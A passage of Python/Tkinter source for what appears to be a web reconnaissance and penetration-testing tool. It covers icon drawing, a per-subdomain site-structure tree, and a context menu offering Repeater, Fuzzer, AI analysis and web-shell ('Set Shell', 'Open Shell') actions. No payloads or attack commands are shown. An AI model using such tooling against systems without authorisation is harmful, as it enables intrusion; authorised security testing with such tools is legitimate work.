    L_era = s * 0.15
    L_body = max(0.0, L - L_tip - L_era)
    p_era_back  = (ex, ey)
    p_body_back = (ex + L_era * ux, ey + L_era * uy)
    p_body_tip  = (p_body_back[0] + L_body * ux,
                   p_body_back[1] + L_body * uy)
    p_tip       = (tx, ty)

    def off(p, side):
        """Offset point `p` perpendicular to the pencil axis by half-width on the
        given `side` (+1/-1), to build the pencil's two long edges."""
        return (p[0] + side * perpx * hw, p[1] + side * perpy * hw)

    # Eraser (pink)
    ax.add_patch(mpatches.Polygon([
        off(p_era_back, +1), off(p_era_back, -1),
        off(p_body_back, -1), off(p_body_back, +1)],
        closed=True, facecolor='#f48fb1', edgecolor='#202020',
        linewidth=0.6, zorder=z))
    # Body (yellow)
    ax.add_patch(mpatches.Polygon([
        off(p_body_back, +1), off(p_body_back, -1),
        off(p_body_tip, -1), off(p_body_tip, +1)],
        closed=True, facecolor='#f4d03f', edgecolor='#202020',
        linewidth=0.6, zorder=z + 0.1))
    # Wood tip (triangle)
    ax.add_patch(mpatches.Polygon([
        off(p_body_tip, +1), off(p_body_tip, -1), p_tip],
        closed=True, facecolor='#d4a373', edgecolor='#202020',
        linewidth=0.6, zorder=z + 0.2))
    # Lead point (small dark triangle at the very tip)
    p_lead_back = (p_tip[0] - L_tip * 0.55 * ux,
                   p_tip[1] - L_tip * 0.55 * uy)
    ax.add_patch(mpatches.Polygon([
        (p_lead_back[0] + perpx * hw * 0.55,
         p_lead_back[1] + perpy * hw * 0.55),
        (p_lead_back[0] - perpx * hw * 0.55,
         p_lead_back[1] - perpy * hw * 0.55),
        p_tip],
        closed=True, facecolor='#202020', edgecolor='#202020',
        linewidth=0.4, zorder=z + 0.3))


def _icon_alert(ax, x, y, s, z):
    """Yellow warning triangle with a '!' over the top-LEFT of a node icon,
    marking a failure state (transport error or 5xx). Sits opposite the
    edited-pencil (top-right) so the two never overlap on one node."""
    cx, cy = x - s * 0.72, y + s * 0.72   # top-left corner
    r = s * 0.62
    tri = [(cx, cy + r), (cx - r * 0.92, cy - r * 0.62),
           (cx + r * 0.92, cy - r * 0.62)]
    ax.add_patch(mpatches.Polygon(
        tri, closed=True, facecolor='#f4c20d', edgecolor='#202020',
        linewidth=0.7, zorder=z, joinstyle='round'))
    # Exclamation mark: a short bar plus a dot.
    ax.add_patch(mpatches.Rectangle(
        (cx - r * 0.09, cy - r * 0.18), r * 0.18, r * 0.55,
        facecolor='#202020', edgecolor='none', zorder=z + 0.1))
    ax.add_patch(mpatches.Circle(
        (cx, cy - r * 0.36), r * 0.12,
        facecolor='#202020', edgecolor='none', zorder=z + 0.1))


def _render_app_icon_png(px):
    """Render the app icon — the page-style Chicago-95 window with a magnifying
    glass centred over it (same look as the launcher icon) — to PNG bytes. The
    lens spans ~3/4 of the window's width and is semi-transparent so the window
    shows through it."""
    fig = plt.figure(figsize=(px / 100.0, px / 100.0), dpi=100)
    ax = fig.add_axes([0, 0, 1, 1])
    ax.set_xlim(-1.3, 1.3)
    ax.set_ylim(-1.3, 1.3)
    ax.set_aspect('equal')
    ax.axis('off')

    # The window — exactly the page node's icon (silver frame, blue title bar,
    # min/max/close buttons, white client area), centred.
    wx, wy, s = 0.0, 0.08, 0.62
    _win95_window(ax, wx, wy, s, C['node_page'], z=2)

    # Magnifying glass centred on the window; diameter ≈ 3/4 of the window width.
    win_w = 1.95 * s
    r = 0.75 * win_w / 2.0
    # Nudge the glass ~5px down-right (≈10% of the icon, the axes span is 2.6).
    cx, cy = wx + 0.26, wy - 0.26
    ang = math.radians(-45)
    h1 = (cx + r * math.cos(ang), cy + r * math.sin(ang))
    h2 = (cx + (r + 0.45) * math.cos(ang), cy + (r + 0.45) * math.sin(ang))
    ax.plot([h1[0], h2[0]], [h1[1], h2[1]], color='#202020', linewidth=5.0,
            solid_capstyle='round', zorder=8)
    ax.add_patch(mpatches.Circle((cx, cy), r, facecolor='#bfe3ff', alpha=0.35,
                                 edgecolor='none', zorder=9))
    ax.add_patch(mpatches.Circle((cx, cy), r, fill=False, edgecolor='#202020',
                                 linewidth=3.0, zorder=10))
    ax.plot([cx - r * 0.5, cx - r * 0.1], [cy + r * 0.5, cy + r * 0.15],
            color='#ffffff', linewidth=1.8, solid_capstyle='round', zorder=11)

    import io
    buf = io.BytesIO()
    fig.savefig(buf, format='png', transparent=True, dpi=100)
    plt.close(fig)
    return buf.getvalue()


def _icon_file():
    """Path to the bundled app icon, in reconner-icons/ next to this script (the
    same folder as the node icons; works from source and once installed)."""
    return os.path.join(_node_icon_dir(), 'reconner-ico.png')


def _app_icon_photo(target_px=31):
    """Return the app icon as a Tk image sized to target_px. Prefers the bundled
    reconner-ico.png (resized cleanly via Pillow, or nearest-neighbour subsample
    as a fallback); if it's missing, falls back to the matplotlib-rendered icon.
    Requires a Tk root to already exist."""
    path = _icon_file()
    if os.path.isfile(path):
        try:
            from PIL import Image, ImageTk
            im = Image.open(path).convert('RGBA').resize(
                (target_px, target_px), Image.LANCZOS)
            return ImageTk.PhotoImage(im)
        except Exception:
            pass
        try:
            img = tk.PhotoImage(file=path)
            f = max(1, round(img.width() / target_px))
            return img.subsample(f, f)
        except Exception:
            pass
    if not MPL_AVAILABLE:
        return None
    try:
        import base64
        scale = 4
        png = _render_app_icon_png(target_px * scale)
        img = tk.PhotoImage(data=base64.b64encode(png).decode('ascii'))
        return img.subsample(scale, scale)
    except Exception:
        return None


def _merlin_hat_photo(target_px=18):
    """The blue wizard-hat icon (reconner-icons/merlin-hat.png) as a Tk image
    sized to target_px, or None if it can't be loaded. Requires a Tk root."""
    path = os.path.join(_node_icon_dir(), 'merlin-hat.png')
    if not os.path.isfile(path):
        return None
    try:
        from PIL import Image, ImageTk
        im = Image.open(path).convert('RGBA').resize(
            (target_px, target_px), Image.LANCZOS)
        return ImageTk.PhotoImage(im)
    except Exception:
        pass
    try:
        img = tk.PhotoImage(file=path)
        f = max(1, round(img.width() / target_px))
        return img.subsample(f, f)
    except Exception:
        return None


# ─────────────────────────────────────────────
# Panel 1 – Graph
# ─────────────────────────────────────────────
class GraphPanel(tk.Frame):
    """The Site Structure panel: a collapsible tree (ttk.Treeview) of the
    discovered SiteNodes for the active host. Each row shows an expand/collapse
    arrow (only when it has children), a per-type icon and the node's name.

    Holds one independent model per discovered host (subdomain) and aliases the
    active host's nodes onto self.nodes so the app / JSON-IO surface is unchanged.
    Callbacks (on_select, on_clear, on_delete, …) report user actions back to the
    application. Replaces the former Matplotlib node-and-edge graph (no images,
    zooming or PNG export)."""

    _ICON_PX = 16
    # The tree panel's own (narrow) Subdomains-button width, so the control row
    # fits snugly with symmetric margins (the Tech Scan popup keeps the wider
    # global SUBDOMAIN_BTN_W). A selected host is truncated to fit.
    _SUB_BTN_W = 13

    def __init__(self, parent, on_select=None, on_clear=None, on_save_json=None,
                 on_delete=None, on_deselect=None, on_save_json_all=None,
                 on_load_json=None, scope_var=None, **kw):
        """Wire the action callbacks, initialise the multi-host model and build
        the panel (top menus, tree, bottom search row)."""
        super().__init__(parent, bg=C['bg'], relief='ridge', bd=2, **kw)
        self.on_select = on_select
        self.on_clear = on_clear
        self.on_save_json = on_save_json
        self.on_save_json_all = on_save_json_all
        self.on_load_json = on_load_json
        self.on_delete = on_delete
        self.on_deselect = on_deselect
        # Set by the app so the right-click node menu can drive the inspector.
        self.info_panel = None
        self._node_menu = None
        self._ctx_menu = None
        self._menu_dismiss_after = None
        # Multi-host model: one independent model per discovered host. The active
        # model's node dict is aliased onto self.nodes.
        self.graphs: dict[str, dict] = {}
        self.active_host: str | None = None
        self.nodes: dict[str, SiteNode] = {}
        self.selected: str | None = None
        # Scope is owned by the toolbar; the panel only exposes it for the app /
        # scanner via scope_text()/set_scope().
        self._scope_var = scope_var if scope_var is not None else tk.StringVar(value='')
        self._scanning = False
        self._build_id = None
        self._settle_id = None
        # Per-type visibility toggles (Filter menu).
        self.type_vars: dict[str, tk.BooleanVar] = {}
        # Search state: matching iids (tree order) + cursor.
        self._search_matches: list = []
        self._search_idx = -1
        self._search_query = ''
        # Icon cache (PhotoImage per node type; refs held so Tk can't GC them).
        self._icons: dict = {}
        self._build()

    # ── icons ─────────────────────────────────────────────────────────
    def _load_icons(self):
        """Load the per-type PNG sprites resized to a small tree icon (PIL).
        Silently leaves icons empty if PIL or the files are unavailable."""
        try:
            from PIL import Image, ImageTk
        except Exception:
            return
        mapping = {'page': 'page', 'file': 'file', 'redirect': 'redirect',
                   'script': 'script', 'endpoint': 'api', 'shell': 'shell',
                   'dir': 'page'}
        for ntype, fname in mapping.items():
            path = os.path.join(_node_icon_dir(), f'{fname}.png')
            try:
                img = Image.open(path).convert('RGBA').resize(
                    (self._ICON_PX, self._ICON_PX), Image.LANCZOS)
                self._icons[ntype] = ImageTk.PhotoImage(img)
            except Exception:
                pass

    def _icon_for(self, node):
        """The PhotoImage for `node`'s type (falls back to the page icon / None)."""
        nt = (node.node_type if node else 'page') or 'page'
        return self._icons.get(nt) or self._icons.get('page')

    # ── build ─────────────────────────────────────────────────────────
    def _build(self):
        """Build the panel: title bar, the top control row (Subdomains / Options /
        Filter dropdowns), the tree, and the bottom Search row."""
        _titlebar(self, 'Site Structure').pack(fill='x')
        self._load_icons()

        ctrl = tk.Frame(self, bg=C['bg'])
        ctrl.pack(fill='x', padx=4, pady=2)
        self._ctrl = ctrl
        # Subdomains selector — one entry per discovered host; selecting one shows
        # its tree. Empty/disabled until a host is added.
        self._subdomain_var = tk.StringVar(value='')
        self.subdomain_btn = tk.Menubutton(ctrl, text='Subdomains ▾', bg=C['btn'],
                                           activebackground=C['btn'], relief='raised',
                                           bd=2, font=C['font'], padx=6,
                                           highlightthickness=0, state='disabled',
                                           width=self._SUB_BTN_W, anchor='w')
        self._subdomain_menu = tk.Menu(self.subdomain_btn, tearoff=0, bg=C['btn'],
                                       fg=C['black'], activebackground=C['sel_bg'],
                                       activeforeground=C['sel_fg'], font=C['font'])
        self.subdomain_btn.config(menu=self._subdomain_menu)
        self.subdomain_btn.pack(side='left', padx=2)

        menu_btn = tk.Menubutton(ctrl, text='Options ▾', bg=C['btn'],
                                 activebackground=C['btn'], relief='raised',
                                 bd=2, font=C['font'], padx=6, highlightthickness=0)
        menu = tk.Menu(menu_btn, tearoff=0, bg=C['btn'], fg=C['black'],
                       activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                       font=C['font'])
        menu.add_command(label='Expand all', command=self._expand_all)
        menu.add_command(label='Collapse all', command=self._collapse_all)
        if self.on_clear:
            menu.add_separator()
            menu.add_command(label='Clear', command=self.on_clear)
        menu.add_separator()
        if self.on_save_json:
            menu.add_command(label='Export JSON', command=self.on_save_json)
        if self.on_save_json_all:
            menu.add_command(label='Export ALL graphs (JSON)',
                             command=self.on_save_json_all)
        if self.on_load_json:
            menu.add_separator()
            menu.add_command(label='Load scan JSON…', command=self.on_load_json)
        menu_btn.config(menu=menu)
        menu_btn.pack(side='left', padx=2)
        self._options_menu = menu

        # Per-type visibility filters (one checkbox per node type).
        filt_btn = tk.Menubutton(ctrl, text='Filter ▾', bg=C['btn'],
                                 activebackground=C['btn'], relief='raised',
                                 bd=2, font=C['font'], padx=6, highlightthickness=0)
        fmenu = tk.Menu(filt_btn, tearoff=0, bg=C['btn'], fg=C['black'],
                        activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                        font=C['font'])
        for label in ('page', 'file', 'redirect', 'script', 'endpoint', 'shell'):
            var = tk.BooleanVar(value=True)
            self.type_vars[label] = var
            fmenu.add_checkbutton(label=label, variable=var, command=self._redraw)
        filt_btn.config(menu=fmenu)
        filt_btn.pack(side='left', padx=2)
        self._filter_menu = fmenu
        self._arm_ctx_dismiss(self._options_menu)
        self._arm_ctx_dismiss(self._filter_menu)

        # The tree itself (single column; the implicit tree column shows the
        # arrow + icon + name).
        twrap = tk.Frame(self, bg=C['bg'])
        twrap.pack(fill='both', expand=True, padx=2, pady=2)
        twrap.rowconfigure(0, weight=1)
        twrap.columnconfigure(0, weight=1)
        self.tree = ttk.Treeview(twrap, show='tree', selectmode='browse')
        self.tree.grid(row=0, column=0, sticky='nsew')
        vsb = tk.Scrollbar(twrap, orient='vertical', command=self.tree.yview)
        vsb.grid(row=0, column=1, sticky='ns')
        hsb = tk.Scrollbar(twrap, orient='horizontal', command=self.tree.xview)
        hsb.grid(row=1, column=0, sticky='ew')
        self.tree.config(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.bind('<<TreeviewSelect>>', self._on_tree_select)
        self.tree.bind('<Button-3>', self._on_right_click)
        self.tree.bind('<Escape>', self._deselect)

        # Bottom row: Search field + ◀ / ▶ occurrence stepping.
        bot = tk.Frame(self, bg=C['bg'])
        bot.pack(fill='x', padx=4, pady=(0, 3))
        tk.Label(bot, text='Search:', bg=C['bg'],
                 font=C['font']).pack(side='left', padx=(0, 2))
        # Pack the ◀ / ▶ steppers first (anchored right at their natural, equal
        # size) so the search Entry simply fills whatever space is left — that
        # way neither arrow is ever squeezed or clipped by the panel border.
        Btn(bot, text='▶', padx=4,
            command=self._search_next).pack(side='right', padx=(1, 2))
        Btn(bot, text='◀', padx=4,
            command=self._search_prev).pack(side='right', padx=(6, 1))
        self._search_var = tk.StringVar(value='')
        se = tk.Entry(bot, textvariable=self._search_var, font=C['font'],
                      relief='sunken', bd=2, bg=C['window'], highlightthickness=0)
        se.bind('<KeyRelease>', self._on_search)
        se.pack(side='left', fill='x', expand=True)
        self._search_ent = se

    # ── tree helpers ──────────────────────────────────────────────────
    def _iter_iids(self, parent=''):
        """All item ids under `parent` (depth-first, document order)."""
        out = []
        for iid in self.tree.get_children(parent):
            out.append(iid)
            out.extend(self._iter_iids(iid))
        return out

    @staticmethod
    def _node_label(node):
        """The display name for a node: the host for a bare site root, otherwise
        the node's short label (last path segment)."""
        try:
            p = urlparse(node.url)
        except Exception:
            return node.url
        if not p.path.strip('/') and not p.query and not p.fragment:
            return p.netloc or node.url
        return node.label()

    def _empty(self):
        """Clear every row from the tree (empty state)."""
        try:
            for iid in self.tree.get_children(''):
                self.tree.delete(iid)
        except Exception:
            pass

    def _expand_all(self):
        """Open every node in the tree."""
        for iid in self._iter_iids():
            self.tree.item(iid, open=True)

    def _collapse_all(self):
        """Collapse every node in the tree."""
        for iid in self._iter_iids():
            self.tree.item(iid, open=False)

    # ── Per-host graph models ─────────────────────────────────────
    @staticmethod
    def _host_of(url: str) -> str:
        """Host (no port) for a node URL; '' falls back to a single bucket."""
        try:
            return _host_only(urlparse(url).netloc) or '(local)'
        except Exception:
            return '(local)'

    def _default_config(self) -> dict:
        """Per-graph control state at its defaults (each subdomain starts here)."""
        return {'types': {k: True for k in ('page', 'file', 'redirect', 'script',
                                            'endpoint', 'shell')}}

    def _new_model(self, host: str) -> dict:
        """Build a fresh, empty per-host model for `host`."""
        return {'host': host, 'nodes': {}, 'selected': None,
                'dirty': True, 'config': self._default_config()}

    def _read_config(self) -> dict:
        """Snapshot the shared filter widgets into a plain dict (per-graph save)."""
        return {'types': {k: v.get() for k, v in self.type_vars.items()}}

    def _apply_config(self, cfg: dict):
        """Push a saved per-graph config back into the shared filter widgets."""
        for k, v in cfg.get('types', {}).items():
            if k in self.type_vars:
                self.type_vars[k].set(v)

    def _save_active(self):
        """Persist the active graph's working set into its model."""
        if self.active_host is None or self.active_host not in self.graphs:
            return
        m = self.graphs[self.active_host]
        m['nodes'] = self.nodes
        m['selected'] = self.selected
        m['config'] = self._read_config()

    def _ensure_graph(self, host: str) -> dict:
        """Return the model for `host`, creating it (and its Subdomains entry) on
        first sight. The first host seen becomes the active/primary graph."""
        m = self.graphs.get(host)
        if m is None:
            m = self.graphs[host] = self._new_model(host)
            self._add_subdomain_entry(host)
            if self.active_host is None:
                self._activate(host)
        return m

    def _activate(self, host: str):
        """Switch the displayed tree to `host`: save the current one, rebind the
        node dict to the target model, restore its filters and rebuild the tree."""
        if host not in self.graphs or host == self.active_host:
            return
        self._save_active()
        m = self.graphs[host]
        self.active_host = host
        self._search_matches = []
        self._search_idx = -1
        self._search_query = ''
        try:
            self._search_var.set('')
            self._search_ent.config(bg=C['window'])
        except Exception:
            pass
        self.nodes = m['nodes']
        self.selected = m['selected']
        self._apply_config(m['config'])
        self._set_subdomain_label(host)
        m['dirty'] = False
        self._rebuild_tree()

    def add_node(self, node: SiteNode):
        """Add (or replace) `node` in its host's model. Schedules a (debounced)
        tree rebuild when the node belongs to the active host, else marks that
        host's model dirty."""
        host = self._host_of(node.url)
        m = self._ensure_graph(host)
        if self._fold_locale_variant(m, node):
            if host == self.active_host:
                self._schedule_build()
            else:
                m['dirty'] = True
            return
        m['nodes'][node.url] = node
        if host == self.active_host:
            self._schedule_build()
        else:
            m['dirty'] = True

    def _fold_locale_variant(self, m, node: SiteNode) -> bool:
        """Collapse per-locale variants of one endpoint into a single node to cut
        map noise (…/en/auth, …/pt/auth → one node carrying the others in
        locale_variants). Returns True when `node` was folded into an existing
        representative and should NOT be added as its own row.

        Only runs during a live scan — loading a saved graph or adding an
        edited/Repeater node reproduces nodes verbatim."""
        if not self._scanning or node.edited:
            return False
        canon, loc = _canonical_locale_url(node.url)
        if canon is None:
            return False
        reps = m.setdefault('locale_rep', {})
        rep_url = reps.get(canon)
        if rep_url is None or rep_url == node.url or rep_url not in m['nodes']:
            reps[canon] = node.url
            if loc and loc not in node.locale_variants:
                node.locale_variants = [loc] + [
                    l for l in node.locale_variants if l != loc]
            return False
        rep = m['nodes'][rep_url]
        if loc and loc not in rep.locale_variants:
            rep.locale_variants.append(loc)
        return True

    # ── rebuild (debounced during scans) ──────────────────────────────
    def _schedule_build(self):
        """Coalesce the burst of add_node() calls during a scan into a few tree
        rebuilds (the debounce grows with the node count)."""
        if self._build_id is None:
            cap = 2000 if self._scanning else 400
            delay = int(min(cap, 100 + 0.5 * len(self.nodes)))
            self._build_id = self.after(delay, self._do_build)

    def _do_build(self):
        """Rebuild the active host's tree (deferred entry point used by the
        debounce timer and a few direct callers)."""
        self._build_id = None
        self._rebuild_tree()

    def _redraw(self, *_):
        """Rebuild the tree now (filter change / immediate refresh)."""
        self._rebuild_tree()

    def _rebuild_tree(self):
        """Rebuild the whole tree from the active host's nodes + parent links,
        honouring the type filters and preserving expansion + selection."""
        tree = self.tree
        prev_expanded = {iid for iid in self._iter_iids()
                         if tree.item(iid, 'open')}
        had_any = bool(prev_expanded or tree.get_children(''))
        sel = self.selected
        self._empty()
        if not self.nodes:
            return
        enabled = {t for t, v in self.type_vars.items() if v.get()}
        visible = {url: n for url, n in self.nodes.items()
                   if (n.node_type or 'page') in enabled}
        if not visible:
            return

        def visible_parent(url):
            """The nearest visible ancestor's iid for `url`, or '' for a root."""
            p = self.nodes[url].parent_url if url in self.nodes else None
            seen = set()
            while p and p not in seen:
                seen.add(p)
                if p in visible:
                    return p
                p = self.nodes[p].parent_url if p in self.nodes else None
            return ''

        inserted = set()

        def insert(url):
            """Insert `url` (after its visible parent), recursing parents first."""
            if url in inserted:
                return
            parent_iid = visible_parent(url)
            if parent_iid and parent_iid not in inserted:
                insert(parent_iid)
            node = visible[url]
            kw = {'text': ' ' + self._node_label(node)}
            img = self._icon_for(node)
            if img is not None:
                kw['image'] = img
            try:
                tree.insert(parent_iid, 'end', iid=url, **kw)
                inserted.add(url)
            except tk.TclError:
                pass

        for url in sorted(visible.keys()):
            insert(url)
        # Restore expansion: keep what was open; on the first populated build open
        # everything so the freshly-revealed structure is visible.
        for iid in inserted:
            tree.item(iid, open=(iid in prev_expanded or not had_any))
        if sel in inserted:
            tree.selection_set(sel)
            tree.see(sel)

    def delete_node(self, url: str) -> bool:
        """Remove `url` from the active model and rebuild. Returns False if the
        URL isn't tracked. The caller handles UI side effects (count/status)."""
        if url not in self.nodes:
            return False
        self.nodes.pop(url, None)
        if self.selected == url:
            self.selected = None
        self._rebuild_tree()
        return True

    def clear(self):
        """Drop every per-host model and reset to an empty active tree."""
        self.graphs = {}
        self.active_host = None
        self._reset_subdomain_menu()
        self.nodes = {}
        self.selected = None
        self._apply_config(self._default_config())
        for attr in ('_build_id', '_settle_id'):
            tid = getattr(self, attr, None)
            if tid is not None:
                try:
                    self.after_cancel(tid)
                except Exception:
                    pass
                setattr(self, attr, None)
        self._empty()

    def set_scanning(self, scanning: bool):
        """Mark whether a scan is streaming (loosens the rebuild debounce). On the
        scan finishing, force one final rebuild so the tree settles."""
        self._scanning = bool(scanning)
        if not scanning:
            self._schedule_build()

    # ── Subdomains dropdown ───────────────────────────────────────────
    def _add_subdomain_entry(self, host: str):
        """Add a host to the Subdomains dropdown (idempotent) and enable it."""
        if not hasattr(self, '_subdomain_menu'):
            return
        end = self._subdomain_menu.index('end')
        for i in range(0, (end + 1) if end is not None else 0):
            if self._subdomain_menu.entrycget(i, 'label') == host:
                return
        self._subdomain_menu.add_radiobutton(
            label=host, value=host, variable=self._subdomain_var,
            command=lambda h=host: self._activate(h))
        self.subdomain_btn.config(state='normal')

    def _set_subdomain_label(self, host: str):
        """Set the Subdomains button label to the selected `host` (no 'Subdomains:'
        prefix), truncated (leading …) to the panel's narrow button width."""
        self._subdomain_var.set(host)
        if not host:
            self.subdomain_btn.config(text='Subdomains ▾')
            return
        budget = max(6, self._SUB_BTN_W - len(' ▾'))
        short = host if len(host) <= budget else '…' + host[-(budget - 1):]
        self.subdomain_btn.config(text=f'{short} ▾')

    def _reset_subdomain_menu(self):
        """Clear and disable the Subdomains dropdown (no hosts discovered yet)."""
        if hasattr(self, '_subdomain_menu'):
            try:
                self._subdomain_menu.delete(0, 'end')
            except Exception:
                pass
        if hasattr(self, 'subdomain_btn'):
            self.subdomain_btn.config(text='Subdomains ▾', state='disabled')
        if hasattr(self, '_subdomain_var'):
            self._subdomain_var.set('')

    def ensure_graph(self, host: str):
        """Public hook so the app can pre-create a subdomain's model (and its
        dropdown entry) on the UI thread before its scan streams nodes in."""
        if host:
            self._ensure_graph(self._host_of('https://' + host
                                             if '://' not in host else host))

    # ── scope (owned by the toolbar) ──────────────────────────────────
    def scope_text(self) -> str:
        """Current scope text (used by the app to constrain crawl + proxy)."""
        return self._scope_var.get().strip()

    def set_scope(self, text: str):
        """Set the scope field text."""
        self._scope_var.set(text or '')

    # ── search (Search field + ◀ / ▶ stepping) ────────────────────────
    def _build_search_matches(self, query: str) -> list:
        """Visible iids whose URL or title contains `query` (case-insensitive),
        in tree (document) order."""
        q = query.strip().lower()
        if not q:
            return []
        out = []
        for iid in self._iter_iids():
            node = self.nodes.get(iid)
            title = (getattr(node, 'title', '') or '') if node else ''
            if q in iid.lower() or q in title.lower():
                out.append(iid)
        return out

    def _on_search(self, *_):
        """Search field changed: recompute matches and select the first one. Tints
        the entry red when there's no match; a repeated query is a no-op."""
        query = self._search_var.get()
        if query == self._search_query:
            return
        self._search_query = query
        self._search_matches = self._build_search_matches(query)
        self._search_idx = -1
        try:
            self._search_ent.config(
                bg=(C['window'] if (self._search_matches or not query.strip())
                    else '#ffd6d6'))
        except Exception:
            pass
        if self._search_matches:
            self._search_step(0)

    def _search_step(self, delta: int):
        """Move the search cursor by `delta` (wrapping) and select+reveal that
        match. delta=0 selects the current index (first call → index 0)."""
        if not self._search_matches:
            return
        n = len(self._search_matches)
        self._search_idx = (self._search_idx + delta) % n if self._search_idx >= 0 \
            else 0
        url = self._search_matches[self._search_idx]
        if url not in self.nodes:
            self._search_matches = self._build_search_matches(self._search_query)
            if not self._search_matches:
                return
            self._search_idx %= len(self._search_matches)
            url = self._search_matches[self._search_idx]
        self._select_and_center(url)

    def _search_next(self, *_):
        """▶ — select the next occurrence (wraps to the first)."""
        self._search_step(1)

    def _search_prev(self, *_):
        """◀ — select the previous occurrence (wraps to the last)."""
        self._search_step(-1)

    # ── selection ─────────────────────────────────────────────────────
    def _on_tree_select(self, _evt=None):
        """Tree-selection handler → drive the inspector via on_select."""
        sel = self.tree.selection()
        if not sel:
            return
        url = sel[0]
        self.selected = url
        if self.on_select and url in self.nodes:
            self.on_select(self.nodes[url])

    def _select_and_center(self, url: str):
        """Select `url`, open its ancestors and scroll it into view."""
        if url not in self.nodes:
            return
        if not self.tree.exists(url):
            self._rebuild_tree()
        if not self.tree.exists(url):
            return
        p = self.tree.parent(url)
        while p:
            self.tree.item(p, open=True)
            p = self.tree.parent(p)
        self.selected = url
        self.tree.selection_set(url)
        self.tree.see(url)
        if self.on_select and url in self.nodes:
            self.on_select(self.nodes[url])

    def _deselect(self, *_):
        """Clear the current selection and notify the app."""
        sel = self.tree.selection()
        if sel:
            self.tree.selection_remove(sel)
        if self.selected is not None:
            self.selected = None
            if self.on_deselect:
                self.on_deselect()

    # ── right-click context menus ─────────────────────────────────────
    def _on_right_click(self, ev):
        """Post the per-node tool menu when right-clicking a row, else the
        background (Options + Filter) menu."""
        iid = self.tree.identify_row(ev.y)
        if iid:
            self.tree.selection_set(iid)
            self.selected = iid
            if self.on_select and iid in self.nodes:
                self.on_select(self.nodes[iid])
            menu = self._build_node_menu(iid)
        else:
            menu = self._build_background_menu()
        if menu is None:
            return
        self._ctx_menu = menu
        try:
            menu.tk_popup(ev.x_root, ev.y_root)
        finally:
            menu.grab_release()

    def _build_background_menu(self):
        """A context menu offering the Options and Filter dropdowns as cascades."""
        m = tk.Menu(self, tearoff=0, bg=C['btn'], fg=C['black'],
                    activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                    font=C['font'])
        if getattr(self, '_options_menu', None) is not None:
            m.add_cascade(label='Options', menu=self._options_menu)
        if getattr(self, '_filter_menu', None) is not None:
            m.add_cascade(label='Filter', menu=self._filter_menu)
        self._arm_ctx_dismiss(m)
        return m

    def _build_node_menu(self, url):
        """A context menu of the inspector's per-node tools for the node at `url`,
        delegating to the InfoPanel (which targets the selected node). Open Shell
        is disabled unless the node is a shell; Delete Node unless user-created."""
        info = self.info_panel
        if info is None:
            return None
        node = self.nodes.get(url)
        is_shell = bool(node and node.node_type == 'shell')
        deletable = bool(node and getattr(node, 'edited', False))
        m = tk.Menu(self, tearoff=0, bg=C['btn'], fg=C['black'],
                    activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                    font=C['font'])
        m.add_command(label='Analyze with AI', command=info._ai_analyze)
        m.add_command(label='Open in Browser', command=info._open_in_browser)
        m.add_separator()
        m.add_command(label='Repeater', command=info._open_repeater)
        m.add_command(label='Fuzzer', command=info._open_fuzzer)
        m.add_separator()
        m.add_command(label='Set Shell', command=info._set_shell)
        m.add_command(label='Open Shell', command=info._open_shell,
                      state=('normal' if is_shell else 'disabled'))
        if self.on_delete:
            m.add_separator()
            m.add_command(label='Delete Node', command=self.on_delete,
                          state=('normal' if deletable else 'disabled'))
        self._arm_ctx_dismiss(m)
        self._node_menu = m
        return m

    def _arm_ctx_dismiss(self, menu):
        """Make `menu` part of the right-click auto-dismiss: leaving it arms a
        short close timer; re-entering any armed menu cancels it."""
        menu.bind('<Enter>', lambda _e: self._cancel_menu_dismiss(), add='+')
        menu.bind('<Leave>', lambda _e: self._schedule_menu_dismiss(), add='+')

    def _schedule_menu_dismiss(self):
        """Arm the deferred dismiss of the current context menu."""
        self._cancel_menu_dismiss()
        if self._ctx_menu is None:
            return
        self._menu_dismiss_after = self.after(140, self._do_ctx_dismiss)

    def _cancel_menu_dismiss(self):
        """Cancel any pending context-menu dismiss timer."""
        if getattr(self, '_menu_dismiss_after', None) is not None:
            try:
                self.after_cancel(self._menu_dismiss_after)
            except Exception:
                pass
            self._menu_dismiss_after = None

    def _do_ctx_dismiss(self):
        """Close the current context menu — the timer fired without re-entry."""
        self._menu_dismiss_after = None
        m, self._ctx_menu = self._ctx_menu, None
        if m is not None:
            self._dismiss_menu(m)

    def _dismiss_menu(self, menu):
        """Unpost a context menu and drop its grab (best effort)."""
        try:
            menu.unpost()
        except tk.TclError:
            pass
        try:
            menu.grab_release()
        except tk.TclError:
            pass

    def all_graphs(self) -> dict:
        """{host: [SiteNode, ...]} for every discovered model (incl. the active
        one). Used by the app's 'Export ALL graphs (JSON)'."""
        return {h: list(m['nodes'].values()) for h, m in self.graphs.items()}


# ─────────────────────────────────────────────
# Data In / Data Out — a node's parameters reframed as a dataflow:
#   • Data In  : the GET/POST data that was used to *fetch* this node
#                (the data entering the node).
#   • Data Out : every sendable parameter the node *exposes* — form fields
#                (with their method/action) and parameterized outbound links
#                (the data the node can send onward / the Repeater can insert).
# ─────────────────────────────────────────────






# ─────────────────────────────────────────────
# Panel 2 – Node Inspector
# ─────────────────────────────────────────────
class InfoPanel(tk.Frame):
    """The node-inspector panel: shows the selected SiteNode's URL, metadata,
    parameters, request/response and AI insight, and hosts the Analyze-with-AI,
    Repeater and Fuzzer actions. `on_new_node` reports nodes the Repeater/Fuzzer
    create back to the application."""
    def __init__(self, parent, ai: "ollama", on_new_node=None,
                 on_create_shell=None, **kw):
        """Store the AI client and callbacks, then build the widgets.
        `on_create_shell(parent_node, name, param, method)` is called by Set Shell
        to spawn a new shell node as a child of the selected node."""
        super().__init__(parent, bg=C['bg'], relief='ridge', bd=2, **kw)
        self.ai = ai
        self.on_new_node = on_new_node
        self.on_create_shell = on_create_shell
        self.node: SiteNode | None = None
        self._build()

    def _build(self):
        """Build the inspector layout: title bar, scrollable detail fields, the
        request/response views and the action buttons."""
        tb = _titlebar(self, 'Node Inspector')
        tb.pack(fill='x')

        # Notebook lives in a container so the action buttons can sit on the
        # same level as the tabs (top-right, over the empty tab strip).
        container = tk.Frame(self, bg=C['bg'])
        container.pack(fill='both', expand=True)
        nb = ttk.Notebook(container)
        nb.pack(fill='both', expand=True, padx=2, pady=2)
        self.nb = nb
        btns = tk.Frame(container, bg=C['bg'])
        # Position the Options button within the tab-strip band (between the
        # title bar above and the first content row below), nudged off the top.
